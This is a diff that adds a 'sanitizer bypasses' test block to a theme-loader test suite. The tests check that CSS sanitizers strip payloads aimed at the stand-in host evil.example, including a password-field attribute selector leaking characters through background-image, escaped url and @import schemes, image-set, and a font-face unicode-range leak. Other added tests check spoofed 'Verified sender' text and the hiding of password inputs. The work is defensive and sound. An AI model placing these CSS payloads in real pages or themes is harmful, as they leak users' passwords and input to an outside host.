@@ -233,4 +233,51 @@ describe('theme-loader', () => {
       expect(errors.some(e => e.includes('disallowed'))).toBe(true);
     });
   });
+
+  describe('sanitizer bypasses', () => {
+    const BS = String.fromCharCode(92); // backslash
+    const PAYLOADS: Record<string, string> = {
+      protocolRelative: ':root{--color-primary:#123} input[type=password][value$="a"]{background-image:url(//evil.example/k?a)}',
+      escapedScheme: ':root{--color-primary:#123} body{background:url(' + BS + '68ttps://evil.example/x)}',
+      imageSet: ':root{--color-primary:#123} body{background-image:image-set("https://evil.example/x" 1x)}',
+      escapedImport: '@' + BS + '69mport url(//evil.example/i.css); :root{--color-primary:#123}',
+      escapedUrl: ':root{--color-primary:#123; --x: ' + BS + '75rl(//evil.example/y)}',
+      fontFace: ':root{--color-primary:#123} @font-face{font-family:x;src:url(//evil.example/f?A);unicode-range:U+41} body{font-family:x}',
+    };
+
+    it.each(Object.entries(PAYLOADS))('%s: nothing reaches evil.example', (_name, css) => {
+      const { css: cleaned } = sanitizeThemeCSS(css);
+      expect(cleaned).not.toContain('evil.example');
+      expect(sanitizeSkinCSS(css).css).not.toContain('evil.example');
+      expect(validateThemeCSSSafety(css).valid).toBe(false);
+    });
+
+    it('drops rules for any selector but :root and .dark', () => {
+      const css = ':root{--color-primary:#123} [data-testid=sender]::after{content:"Verified sender"} .dark{--color-primary:#456}';
+      const { css: cleaned, warnings } = sanitizeThemeCSS(css);
+      expect(cleaned).not.toContain('Verified sender');
+      expect(cleaned).toContain('--color-primary:#123');
+      expect(cleaned).toContain('--color-primary:#456');
+      expect(warnings.some((w) => w.includes('[data-testid=sender]'))).toBe(true);
+    });
+
+    it('drops rules nested inside :root', () => {
+      const { css: cleaned } = sanitizeThemeCSS(':root{--color-primary:#123; & input[type=password]{display:none}}');
+      expect(cleaned).not.toContain('password');
+    });
+
+    it('keeps @media, @supports and @keyframes wrappers around allowed rules', () => {
+      const css = '@media (prefers-contrast: more){:root{--color-border:#000} body{display:none}} @keyframes pulse{from{opacity:0}to{opacity:1}}';
+      const { css: cleaned } = sanitizeThemeCSS(css);
+      expect(cleaned).toContain('@media (prefers-contrast: more)');
+      expect(cleaned).toContain('--color-border:#000');
+      expect(cleaned).not.toContain('display:none');
+      expect(cleaned).toContain('@keyframes pulse');
+    });
+
+    it('keeps a same-document fragment reference', () => {
+      const css = ':root{--color-primary:#123; --mask: url(#fade)}';
+      expect(sanitizeThemeCSS(css).css).toContain('url(#fade)');
+    });
+  });
 });
